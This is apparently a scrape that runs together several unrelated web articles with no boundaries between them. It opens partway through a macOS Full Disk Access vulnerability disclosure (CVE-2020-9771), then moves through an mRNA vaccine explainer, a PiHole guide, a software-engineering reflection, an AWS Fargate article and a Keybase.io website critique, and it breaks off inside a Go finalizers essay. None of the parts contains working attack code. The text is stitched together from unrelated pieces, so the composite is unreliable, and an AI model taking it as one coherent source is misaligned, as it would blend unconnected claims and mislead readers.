<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

<div id="post-body-5079721101533796934">
<p dir="ltr">Now that we understand the basics of innate and adaptive immunity, we can begin to understand how vaccines work. At a high level, the goal of a vaccine is to prime the adaptive immune system so that it is prepared to fight a particular virus without having to survive a real infection by the virus first. Conventional vaccines take several forms, including:</p><ul><li dir="ltr"><p dir="ltr" role="presentation">Inactivated (“killed”) vaccines can be produced by denaturing viruses in a lab (eg, the Salk polio vaccine or certain flu vaccines)</p></li><li dir="ltr"><p dir="ltr" role="presentation">Attenuated vaccines use weakened but live forms of viruses, either produced in a lab by modifying the virus or derived from a related-but-not-pathogenic strain of virus (eg,&nbsp; the Sabin polio vaccine or the cowpox-based vaccine for smallpox)</p></li></ul><p dir="ltr">These types of vaccines have played an important role in protecting humans from viral disease, but not all viruses can be inactivated or attenuated effectively. Modern vaccinology has therefore started looking to new means of creating vaccines like subunit vaccines, in which viral proteins can be used to stimulate an appropriate immune response without ever introducing the whole virus into the host. &nbsp;</p><p dir="ltr">One novel vaccination strategy has gained a lot of attention in the age of COVID-19: mRNA vaccines. mRNA vaccines for SARS-CoV-2 are being developed by <a href="http://modernatx.com/" target="_blank">Moderna Therapeutics</a>, among others, and they are now progressing through clinical trials. Without commenting on Moderna’s specific implementation of an mRNA vaccine, let’s learn more about how mRNA vaccines work in general.</p><p dir="ltr">You may <a href="https://www.hellovirology.com/2020/05/the-viral-genome.html" target="_blank">recall that eukaryotic cells have DNA in their nucleus</a>, and that DNA gets transcribed into RNA, which in turn gets translated into proteins. This is the process that viruses hijack to replicate themselves; an RNA virus gets translated by the same cellular machinery that translates standard cellular RNA.&nbsp;</p><br><table><tbody><tr><td><img height="389" src="https://lh4.googleusercontent.com/xI7NmORnNr7_CyWdb3xibxdBcJuiE9qGwPxMFmCNiISIOyxQLMPkGOVoyjQ7e3Ouu9dgiUpIkqr9b1m0MdYV13dafppGhV2wahPpwNH0CFr_tVI-poVC8-DTSx9u2Or9IFU8Cj63" width="318"></td></tr><tr><td>Recap: the "central dogma" of biology says that DNA makes RNA makes proteins.<br></td></tr></tbody></table><p dir="ltr">RNA vaccines leverage the same principle: if we can get RNA into host cells, we can leverage the cellular machinery to make whatever proteins we want. Now, what should we make if we want to make vaccines? You might think that we should try to make host proteins that fight viruses, but the host immune response is so complex that such an approach would be less effective than administering immune signaling proteins directly. Thinking back to how conventional viruses work, you might instead think that we should make a form of the virus, so that the host can “see” it without needing to be actually infected. This might work, but it would of course be very risky to intentionally infect people with whole viral RNA sequences, as these could easily form whole viruses in the host. But-- what if we instead encoded just the viral fragments that get recognized by <a href="https://www.hellovirology.com/2020/06/innate-immune-cells.html" target="_blank">MHC complexes</a> and the adaptive immune system? Then we could cause an immune response, along with the <a href="https://www.hellovirology.com/2020/06/adaptive-immune-cells.html" target="_blank">immunity-providing expansion of T cells and B cells</a> that respond to the viral proteins we’ve encoded, with little chance that the small viral segments we’ve encoded could replicate or cause damage. Et voila-- an mRNA vaccine with lots of potential and minimal infection risk.</p><p dir="ltr">(An aside: what is the “m” in mRNA for? It stands for “messenger RNA.” When RNA is transcribed from the genome, it often has extra sections that aren’t necessary for making proteins. These sections are cleaved out, and only the protein-coding portions of the RNA are then released from the nucleus for translation. These shortened and modified RNAs that are ready for translation are called mRNA. To call a vaccine an mRNA vaccine, then, means that it has pre-prepped the sections of RNA that we want to turn into proteins, rather than strictly including all RNA that would be transcribed from the genomic DNA.)</p><h3>Challenges and innovations</h3><p dir="ltr">This seems like a brilliant strategy, but why don’t we already have mRNA vaccines for all viruses? It turns out that actually developing an mRNA vaccine has a number of different challenges. Just to name a few:</p><ol><li dir="ltr"><p dir="ltr" role="presentation">Not any mRNA sequence will do. The sequence used must encode protein subunits that are pathogenic enough to stimulate an immune response. Many protein subunits from a given virus are not themselves pathogenic, and many more are pathogenic only for certain individuals with certain genetic backgrounds.</p></li><li dir="ltr"><p dir="ltr" role="presentation">Naked RNA molecules can get tangled up and become double-stranded, which makes them untranslatable by cells and can also stimulate innate immune responses that complicate the effect of the vaccine.</p></li><li dir="ltr"><p dir="ltr" role="presentation">RNA usually starts in the nucleus and moves into the cytoplasm of a cell. In the case of an RNA vaccines, we need a way to take RNA from the lab and get it not just into humans, but into cell cytoplasms. This is made especially difficult by the fact that RNA outside of cells is quickly degraded, so the RNA has to be packaged in such a way that preserves the payload and gets it into cells.</p></li></ol><p dir="ltr">Many technological innovations in recent years have therefore been crucial in moving RNA vaccines from a great but impractical theory to the fastest moving vaccine candidate for SARS-CoV-2. Considering just the three challenges mentioned above:</p><ol><li dir="ltr"><p dir="ltr" role="presentation">The ability to quickly sequence viruses and to use both bioinformatic and laboratory methods to analyze the viral genome, identify protein subunits, and test immune responses to those subunits is critical to correctly designing the mRNA sequences that will be used in vaccines.</p></li><li dir="ltr"><p dir="ltr" role="presentation">mRNA vaccine candidates can take advantage of many innovations developed in the last few decades that increase RNA stability and increase translation efficiency in cells. For example: scientists can replace individual nucleotides in the target sequence to create versions of the sequence that still encode the same exact protein subunit but are easier for the cell to translate; RNA produced in cell culture can be purified to remove double-stranded sequences that might cause an unintentional immune response; and the length and nature of the starts and ends of the RNA can be modified to increase its stability.</p></li><li dir="ltr"><p dir="ltr" role="presentation">In order to deliver RNA sequences to the cytoplasm of cells, scientists have devised a number of delivery methods. One approach requires cells from the host; dendritic cells, which are innate immune cells that are especially good at presenting pathogen fragments to adaptive immune cells in the body, are extracted and loaded with target RNA in cell culture, and then infused back into the host. Another popular delivery method, and the one used by Moderna, is to encase the RNA sequences using lipids and polymers. As with live viruses, lipid packaging allows the RNA to pass cellular lipid membranes and enter the cytoplasm, though the actual mechanism by which the lipid particles dump the RNA sequences into cells is incompletely understood.</p></li></ol><br><table><tbody><tr><td><img height="438" src="https://lh3.googleusercontent.com/MadKfHHtWfuKt-cM2obFWHTLEtkvCZDWLkRMaiRsSRGs6oLrBPKp_OIzbk9QVs00NIhSU1CBeVsSSpyRUd-VZtHASY_yS8-P_gXpY4bMHLtMu_h59zYoCEnFlYQpRib1tCm55TXV=w386-h438" width="386"></td></tr><tr><td>RNA vaccines can be delivered in lipid particles that help the RNA gain cell entry.<br></td></tr></tbody></table><p dir="ltr">So to recap, RNA-based approaches offer a whole new set of possibilities in vaccine design-- if we can get them to work in practice.

The current rush to make an RNA-based vaccine for SARS-CoV-2 has the potential to really accelerate the field, though we are still in the early days of exploration in this space.</p><h3>Sources</h3><ul><li dir="ltr"><p dir="ltr" role="presentation">Image 1: <a href="https://commons.wikimedia.org/wiki/File:Central_Dogma_of_Molecular_Biochemistry_with_Enzymes.jpg" target="_blank">https://commons.wikimedia.org/wiki/File:Central_Dogma_of_Molecular_Biochemistry_with_Enzymes.jpg</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation">Image 2: <a href="https://commons.wikimedia.org/wiki/File:SNALP_Structure.jpg" target="_blank">https://commons.wikimedia.org/wiki/File:SNALP_Structure.jpg</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://en.wikipedia.org/wiki/Inactivated_vaccine" target="_blank">https://en.wikipedia.org/wiki/Inactivated_vaccine</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://en.wikipedia.org/wiki/Attenuated_vaccine" target="_blank">https://en.wikipedia.org/wiki/Attenuated_vaccine</a></p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://www.nature.com/articles/nrd.2017.243" target="_blank">mRNA vaccines — a new era in vaccinology</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://www.sciencedirect.com/science/article/pii/S2352396419304384" target="_blank">Long-term efficacy and safety of mRNA therapy in two murine models of methylmalonic acidemia</a>&nbsp;</p></li><li dir="ltr"><p dir="ltr" role="presentation"><a href="https://immunology.sciencemag.org/content/4/35/eaaw6647" target="_blank">A lipid-encapsulated mRNA encoding a potently neutralizing human monoclonal antibody protects against chikungunya infection</a>&nbsp;</p></li></ul>

<br/>
July 3, 2020 | https://yarmo.eu/post/pihole | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/pihole">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><code>#100DaysToOffload &gt;&gt; 2020-05-10 &gt;&gt; 016/100</code></p>
<p><a href="https://pi-hole.net/">PiHole</a> is almost ubiquitously present on every list of services people could/should selfhost. And rightfully so, it is easy to set up and extremely useful on a daily basis. It blocks ads on almost all websites on all the devices in your home without the necessity of installing anything on them. It will also stop some devices from communicating with their parent companies behind your back.</p>
<h2>How it works</h2>
<p>To understand how PiHole does its thing, we need a quick introduction into how DNS works, the system that makes sure we can visit websites even if they are located on the other side of the world. The problem DNS solves is that the URL you use to visit a website doesn't tell your device anything about the physical location or IP address of the server that hosts the website.</p>
<p>If you wish to visit a website, say <a href="https://yarmo.eu/">yarmo.eu</a>, you enter that address in the top bar and hit enter. Your browser will then ask your router to get this website for you. If this is the first time you visit this website, your router doesn't know yet where the server is located, so it asks a DNS server in geographical proximity, usually the DNS server of your ISP.</p>
<p>If this DNS server knows the IP address of the server, it will be relayed back to your device which will now ask that server directly for the content of the website. If the DNS server doesn't have this information, it will ask another and so forth until the IP address of the host server is found.</p>
<p>As we established above, your router contains a DNS router. However, this can almost always be delegated to another DNS server in your home. That's where PiHole comes in. Instead of your router trying to figure out where the website server is located, it will ask PiHole to do so.</p>
<p>But PiHole has a trick up its sleeve: it has a built-in database of hundreds of thousands of URLs that are associated with ads and when they are requested, PiHole simply ignores them.</p>
<p>So you want to visit <code>coolsite.com</code>? Fine, PiHole will get you that website. Now, <code>coolsite.com</code> suddenly wants to load an ad from <code>ads.gafam.com</code>? The computer asks the router, the router asks PiHole, PiHole knows this URL is used to serve ads and will block that request, giving you a website without ads. Awesome!</p>
<h2>Something you want to say?</h2>
<p>Meanwhile, you are listening to music using a wireless speaker in your living room from a made-up brand "NOSON". What you don't know is that this device is continuously sending messages to the company containing information about the music you play and more. PiHole knows this and as soon as the speaker requests to send a message to <code>metrics.noson.com</code>, PiHole says no.</p>
<p>That's how PiHole blocks ads AND protects your privacy.</p>
<h2>Dedicated hardware</h2>
<p>Dedicating hardware to PiHole is advised but the hardware can be as simple as a <a href="https://www.raspberrypi.org/products/raspberry-pi-zero/">Raspberry Pi Zero</a>. The reason it is advised to use dedicated hardware is because if your PiHole crashes, there's no more internet in the home until you get the PiHole working again. It way to prevent this situation from happening is to always have two PiHoles running on separate hardware and telling the router about both PiHoles.</p>
<h2>Second DNS server?</h2>
<p>Oh, and while we're on the subject: do not put any "fallback" DNS servers like Google's or Cloudflare's in the second DNS server field on your router. Unfortunately, it doesn't work like a fallback, all routers will simply divide the workload over the two DNS servers. This means that if an outside DNS server is put in second place, it will receive DNS calls even if the PiHole is fully functional.</p>
<p>Having a proper DNS fallback server is difficult to set up, so best would be to use two different PiHole instances. Unless, of course, you don't mind a small period of internet loss and you are always nearby to fix the situation.</p>
<h2>Caveats</h2>
<p>Unfortunately, ads on video platforms like YouTube will not be blocked. This is because they serve the ads on the same domains as they serve the main content, meaning that they don't have a <code>ads.youtube.com</code> or something similar. Therefore, PiHole cannot block the ads. As there are a few of these edge cases, it is always recommended to use PiHole in conjunction with on-device ad blockers like <a href="https://getublock.com/">uBlock Origin</a>.</p>
<h2>Final words</h2>
<p>Really, there are few reasons to not get PiHole into your home and the benefits vastly outweigh the challenges (IMHO). It is also a great start on a journey of selfhosting more services and realising that one can be independent of major corporations to some degree.</p></div></div>]]>

  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>

<p>On-demand cloud computing brings new ways to ensure scalability and efficiency. Rather than pre-allocating and managing certain server resources or having to go through the usual process of setting up a cloud cluster, apps and microservices can now rely on on-demand serverless computing blocks designed to be efficient and highly optimized.</p>



<p><a rel="noreferrer noopener" href="https://aws.amazon.com/eks/" target="_blank">Amazon Elastic Kubernetes Service (EKS)</a> already makes running Kubernetes on AWS very easy. Support for <a rel="noreferrer noopener" href="https://aws.amazon.com/fargate/" target="_blank">AWS Fargate</a>, which introduces the on-demand serverless computing element to the environment, makes deploying Kubernetes pods even easier and more efficient. AWS Fargate offers a wide range of features that make managing clusters and pods intuitive.</p>



<h2>Utilizing Fargate</h2>



<p>As with many other AWS services, using Fargate to manage Kubernetes clusters is very easy to do. To integrate Fargate and run a cluster on top of it, you only need to add the command <strong><em>–fargate</em></strong> to the end of your <strong><em>eksctl</em></strong> command.</p>



<p>EKS automatically configures the cluster to run on Fargate. It creates a pod execution role so that pod creation and management can be automated in an on-demand environment. It also patches <em>coredns</em> so the cluster can run smoothly on Fargate.</p>



<p>A Fargate profile is automatically created by the command. You can choose to customize the profile later or configure namespaces yourself, but the default profile is suitable for a wide range of applications already, requiring no human input other than a namespace for the cluster.</p>



<p>There are some prerequisites to keep in mind though. For starters, Fargate requires <em>eksctl</em> version 0.20.0 or later. Fargate also comes with some limitations, starting with support for only a handful of regions. For example, Fargate doesn’t support stateful apps, DaemonSets or privileged containers at the moment. Check out <a rel="noreferrer noopener" href="https://docs.aws.amazon.com/eks/latest/userguide/fargate.html#fargate-considerations" target="_blank">this link </a>for Fargate limitations for your consideration.</p>



<p>Support for conventional load balancing is also limited, which is why ALB Ingress Controller is recommended. At the time of this writing, Classic Load Balancers and Network Load Balancers are not supported yet. </p>



<p>However, you can still be very meticulous in how you manage your clusters, including using different clusters to separate trusted and untrusted workloads.</p>



<p>Everything else is straightforward. Once the cluster is created, you can begin specifying pod execution roles for Fargate. You have the ability to use IAM console to create a role and assign it to a Fargate cluster. Or you can also create IAM roles and Fargate profiles via Terraform.&nbsp;</p>



<h2>Profile and Schedules</h2>



<p>Once the cluster is created, you no longer have to use <em>eksctl</em> to run commands. Fargate can also be controlled from the AWS Management Console. To create a Fargate profile, select a cluster and click the Add Fargate Profile to continue.</p>



<p>You can define certain elements of the Fargate profile after assigning a unique name to it. You can, for instance, add tags to the profile. The tags are used exclusively for the profile and will not be propagated to pods within the cluster.</p>



<p>Pod execution role is where you add the role you have created earlier. If you don’t see the role you have created, make sure the role has eks-fargate-pods.amazonaws.com service principal attached to it. Lastly, define a subnet to complete the profile.</p>



<p>There are other customizations and steps that you can take to fine-tune Fargate to your specific needs. At this point, you can choose to update CoreDNS if you want to limit pods to run on Fargate exclusively rather than EC2. This is because by default, CoreDNS is configured to run on Amazon EC2 workers on Amazon EKS clusters.</p>



<p>Apply the modified coredns.json and run the <strong><em>kubectl patch deployment coredns</em></strong> command to commit the changes you have made. Complete the set up by migrating your application to Fargate and setting up the ALB Ingress Controller.</p>



<h2>Additional Features</h2>



<p>You can configure Fargate pods in different ways depending on the specific needs of your application. Fargate offers a wide range of customization options, allowing you to define things such as vCPU and memory resources from the start.</p>



<p>You pay for Fargate based on the requested vCPU and memory resources. There is also a spot pricing option if you want to further lower the cost of running your application in the cloud. More importantly, Fargate can automate the management of long-running computing resources.</p>



<p>Let’s not forget that you can use the Vertical Pod Autoscaler (VPA) and/or Horizontal Pod Autoscaler (HPA). To do this, you need to install metrics server for the VPA or HPA to consume resource metrics (CPU or memory) or make the scaling based on custom or external metrics⁠—depending on what makes more sense from the application point of view. You also need to install the metrics server or Prometheus in order to gain access to the Autoscalers, but everything else works similarly to when your Kubernetes cluster runs on EC2.</p>



<p>Even better, each Fargate pod receives 20GB of ephemeral storage when it is spooled up. The allocated storage gets deleted when the pods are deleted. Storage is encrypted using AES-256 encryption in the latest iteration of AWS Fargate.</p>



<h2>So, Why Fargate?</h2>



<p>Making the decision to migrate to AWS Fargate is easier than you think. If you find yourself underutilizing your cluster resources most of the time, migrating to AWS Fargate is a great way to take cloud efficiency to a whole new level. The main reason for choosing this service though is that it allows you to focus on building your app rather than deploying and maintaining an EKS cluster. However, the limitations exposed above should be taken into consideration before making the decision.</p>



<p>Fargate maintains that simplicity that we know and love from Amazon EKS, all while reducing costs and improving security. As long as you differentiate the clusters used to run apps at different security requirements, protecting your cloud environment becomes easier.</p>



<p>Besides, scaling up (and down) becomes completely hassle-free when your application runs on AWS Fargate. That, at the end of the day, is the biggest advantage of them all.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Disclaimer</h2>
<p>Two days ago, I launched <a href="https://keyoxide.org/">Keyoxide.org</a> which provides a few similar functions as <a href="https://keybase.io/">Keybase.io</a> but in an Open Source package. I've been wanting to write this post for a while but felt it could be perceived as disingenuous if posted before making my own project public. Therefore, I post this now.</p>
<h2>TLDR</h2>
<p>The Keybase.io website uses non-optimized resources resulting in a slow pageload and 5+ year old versions of libraries with known and public security vulnerabilities.</p>
<h2>The Keybase.io website</h2>
<p>I have opinions about the Keybase service, but this post is not about that. This is about the facts behind their website, <a href="https://keybase.io/">Keybase.io</a> and more specifically their <a href="https://keybase.io/encrypt">encrypt</a> page, the one you use to <strong>encrypt private and confidential messages</strong>.</p>
<p>When you load that specific page, make sure to load it in a private session or window to eliminate cached resources. What do you notice?</p>
<p>It is slow. Really slow. I noticed so too and decided to run a <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/">Webpagetest (link to result)</a>. Out of three runs, we analyze only the median run (so not the best one, not the worst one).</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_overview.png" alt="Keybase encrypt Webpagetest overview"><br>
<em>keybase.io/encrypt</em></p>
<h2>The content loaded</h2>
<p>It takes <strong>6.25&nbsp;seconds</strong> to fully load the <strong>2.9&nbsp;megabytes</strong> that are used on this page. That is hefty for a page that is essentially a single form. I mean, look at it:</p>

<em>Why 2.9 megabytes?</em></p>
<p>That's a regular web form. What could possibly be <strong>2.9&nbsp;megabytes</strong>? The javascript?</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1.png" alt="Webpagetest run 1 overview"><br>
<em>How many requests? How many bytes?</em></p>
<p>Most requests are fonts. That makes sense. Earlier, we saw the page only makes <strong>12&nbsp;requests</strong>, so I could imagine a few of those being several fonts files. Fortunately, fonts are only <strong>6.5%</strong> of the bytes loaded, so we'll forgive them.</p>
<p><strong>90&nbsp;percent</strong> of the bytes are due to javascript and images‽ That's <strong>2.6&nbsp;megabytes</strong> for a form! What images?</p>
<h2>Javascript and image(s)</h2>
<p>Let's grab the <a href="https://www.webpagetest.org/result/200627_0Q_044080ef3ab8a678721658c90d2f4706/1/details/#waterfall_view_step1">waterfall</a> and see what is going on:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__wpt_1_waterfall.png" alt="Webpagetest run 1 waterfall"><br>
<em>Run 1 waterfall</em></p>
<p>At two points in time, the loading of the website stalls. The first stall is <strong>2.6&nbsp;seconds</strong> for the file <code>sitewide-js.js</code>. The second stall is <strong>2.5&nbsp;seconds</strong> for the file <code>footprints_transp.png</code>. Let's go.</p>
<h2>sitewide-js.js</h2>
<p>This file is <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped. Let us look at a random excerpt:</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__js_excerpt.png" alt="Javascript excerpt"><br>
<em>Javascript excerpt</em></p>
<p>This is not really optimized for performance: one could choose to minimize the javascript. Allow me to use <code>@node-minify/cli</code>.</p>
<p><code>JS_Parse_Error [SyntaxError]: Unexpected token: name «syms», expected: punc «;»</code></p>
<p>Hmm… Let's remove that one line which simply initializes a variable (only fix I could find). I can no longer guarantee it works but let's assume it does.</p>
<p>Old version: <strong>4.7&nbsp;megabytes</strong> raw and <strong>1.2&nbsp;megabytes</strong> gzipped.<br>
New version: <strong>2.5&nbsp;megabytes</strong> raw and <strong>0.7&nbsp;megabytes</strong> gzipped.</p>
<p>First win!</p>
<p>Well, I need to specify one thing: the website loads a gzipped version of the original file at a size of <strong>1.23&nbsp;megabytes</strong>. When I <code>gzip</code> it on my local machine, the original file even becomes <strong>1&nbsp;megabytes</strong>. I don't know what causes this discrepancy, but while we were able to reduce the raw files by 2.2 megabytes, the reduction could only become 0.3 megabytes once gzipped (on my machine™).</p>
<h2>footprints_transp.png</h2>
<p>Have you found the image yet? It's the little image at the bottom of the dog (?) following footprints. Cute :)</p>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__img.png" alt="Footprints image"><br>
<em>Footprints image</em></p>
<p>Dimensions on page: <strong>330&nbsp;x&nbsp;90 pixels</strong><br>
Dimensions of file: <strong>2836&nbsp;x&nbsp;770 pixels</strong>  </p>
<p>That's only <strong>8.6 times</strong> larger than it needs to be. The bigger crime is the size: <strong>1.4&nbsp;megabytes</strong>. Which is 50% of the website. You guessed it. This could be better.</p>
<p>Using <a href="https://imagecompressor.com/">imagecompressor.com</a>, I can compress this full-sized image down to <strong>398&nbsp;kilobytes</strong> (reduction of <strong>71%</strong>). And I'm even allowing the full 256 colors. And the dimensions are still <strong>8.6&nbsp;times</strong> larger than they need to be.</p>
<p>Optimizing the compression and the image dimensions could yield even better results. I'm not going to bother. The devs didn't either.</p>
<p>Still, second win!</p>
<h2>Anything else we can learn?</h2>
<p>The source code contains this:</p>
<pre><code>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                              K E Y   B A S E

                            crypto for everyone

                        because no one we know ever
                      seems to have a public key. :-(

     No Google Analytics or other 3rd party hosted script tags on Keybase.

     And this has the added bonus that we'll never be able to serve ad code.

                                    \o/  \o/
                                  keybase team

  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre>
<p>I like it when devs get creative. The third paragraph is a bit alienating, but that's my opinion.</p>
<p>Anything else? Given that this is all cryptography related, maybe some security related issues?</p>
<h2>Security</h2>
<p><img src="https://yarmo.eu/content/img/keybase_encrypt__security.png" alt="Webpagetest security score"><br>
<em>Webpagetest security score</em></p>
<p>I've ran quite a few webpagetests on different website, but a <strong>0</strong> security score is new to me. What does that even mean?</p>
<p>Well, <a href="https://snyk.io/test/website-scanner/?test=200627_0Q_044080ef3ab8a678721658c90d2f4706">it turns out</a> that the entire website is built using the following libraries:</p>
<ul>
<li>jquery v1.11.3 (from <a href="https://blog.jquery.com/2015/04/28/jquery-1-11-3-and-2-1-4-released-ios-fail-safe-edition/">april 2015</a>)</li>
<li>bootstrap v3.3.5 (from <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">june 2015</a>)</li>
<li>moment v2.7.0 (from <a href="https://github.com/moment/moment/releases/tag/2.7.0">june 2014</a>)</li>
</ul>
<p>Besides the obvious aging, these libraries account for a total of six known and public security vulnerabilities, including <a href="https://snyk.io/vuln/SNYK-JS-BOOTSTRAP-72890">cross-site scripting</a>, <a href="https://snyk.io/vuln/SNYK-JS-JQUERY-174006">prototype pollution</a> and <a href="https://snyk.io/vuln/npm:moment:20161019">regular expression denial of service</a>. All six security vulnerabilities have remediations.</p>
<p>Let the <a href="https://blog.getbootstrap.com/2015/06/15/bootstrap-3-3-5-released/">bootstrap v3.3.5 announcement</a> be a painful reminder: this is <em>pushing&nbsp;it</em>.</p>
<h2>Wrapping up</h2>
<p>This should give a nice overview of what could go wrong with a non-optimized and aging website. This could happen to any website. But this is Keybase, the company that promises <strong>"secure messaging and file-sharing"</strong>. The same company that got <a href="https://www.crunchbase.com/organization/keybase">$10.8 million in a Serie A funding</a>. The same company that <a href="https://github.com/keybase/client/issues/24105">won't allow us to see their server code</a>.</p>
<p>To paint a full and fair picture, there has been an <a href="https://keybase.io/docs-assets/blog/NCC_Group_Keybase_KB2018_Public_Report_2019-02-27_v1.3.pdf">audit of the Keybase protocol [PDF]</a> which states that:</p>
<blockquote>
<p>[...] there were weaknesses in the Keybase implementation; these were quickly fixed.</p>
</blockquote>
<p>The audit didn't include the website. I'll just end with another quote from the same audit:</p>
<blockquote>
<p>Another common theme was the presence of legacy code. [...]<br>
This does not necessarily imply that legacy code is insecure, but complexity and security are intertwined – every new piece of code may contain a security vulnerability, and more code correlates with more risk.</p>
</blockquote></div></div>]]>

<p><em>2018-04-04, David Crawshaw</em></p>

<p>Like many garbage collected languages, <a href="https://golang.org/">Go</a> lets
you register a
<a href="https://golang.org/pkg/runtime/#SetFinalizer">finalizer</a> on an object.
The finalizer is a function that the language runtime calls when the object
is garbage collected.</p>

<p>Finalizers are deeply unsatisfying. They are almost impossible to use well.</p>

<p>The obvious use of finalizers is to tie resource management to object
lifetime.
This is such an obvious use that you can even find an unfortunate example
of it in the Go standard library. In <a href="https://golang.org/src/os/file_unix.go#L132">package os</a>:</p>

<pre><code>runtime.SetFinalizer(f.file, (*file).close)
</code></pre>

<p>The idea here is an <code>*os.File</code> has a resource from the operating system,
a file descriptor.
At some point those OS resources need to be cleaned up.
Some short-lived small programs can ignore the problem because the OS
will clean up the descriptors when the process exits.
But for long-lived programs, or programs that want to open lots of
descriptors, the program eventually has to call the <code>Close</code> method.</p>

<p>Tracking when precisely a file should be closed is usually
straightforward, but occasionally it involves a great deal of busywork.
So a common instinct we all have is to say "gee, it sure would be nice
if the file descriptor were closed when the <code>File</code> is garbage collected,
let's use a finalizer". This does not work.</p>

<p>Here is an example where the finalizer fails:</p>

<pre><code>package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func fatal(err error) {
	fmt.Fprintf(os.Stderr, "%v\n", err)
	os.Exit(2)
}

func main() {
	dir, err := ioutil.TempDir("", "finalizers-")
	if err != nil {
		fatal(err)
	}
	defer os.RemoveAll(dir)
	fmt.Printf("temp directory: %s\n", dir)
	for i := 0; i &lt; 2000; i++ {
		path := filepath.Join(dir, fmt.Sprintf("tmp-%d", i))
		f, err := os.Create(path)
		if err != nil {
			fatal(err)
		}
		fmt.Fprintf(f, "temp file %d\n", i)

		// f is no longer live, can be GCed
	}
}
</code></pre>

<p>On macOS the result is:</p>

<pre><code>$ go run junk.go 
temp directory: /tmp/finalizers-802262722
open /tmp/finalizers-802262722/tmp-252: too many open files
exit status 2
</code></pre>

<p>Oops.</p>

<h2>Garbage collectors keep their own hours</h2>

<p>The garbage collection contract says nothing about when
collection occurs.
So while there are GC algorithms that free memory the moment it is
no longer used (for example,
<a href="https://en.wikipedia.org/wiki/Reference_counting">reference counting</a>,
it is typical to batch process memory to reduce CPU cycles spent
collecting garbage.</p>

<p>If there is not a lot of demand for new heap space, the Go GC may take
a very long time to free memory, and thus get around to calling the
finalizer.
The cleanup time of objects is open ended.
<strong>It is a bug</strong> to depend on the GC to run before your resources are
exhausted.</p>

<h2>What are finalizers good for?</h2>

<p>Nothing generally.</p>

<p>If you are deeply familiar with the GC algorithm being used in your
runtime, you may be able to use them to manage a resource whose use
is tied closely to heap use.
Maybe C heap.</p>

<p>If you are reasonably sure the algorithm will eventually process all
objects (which is not required by the GC contract!), you could manage
effectively-inexhaustible resources with finalizers.
Maybe very small C objects.</p>

<p>Conceptually you could use finalizers for statistics and book-keeping,
but in practice they cost too many CPU cycles.</p>

<h2>A hypothetical Resource Collector</h2>

<p>I can imagine a programming language where finalizers are useful.</p>

<p>The language's runtime would, in addition to tracking statistics
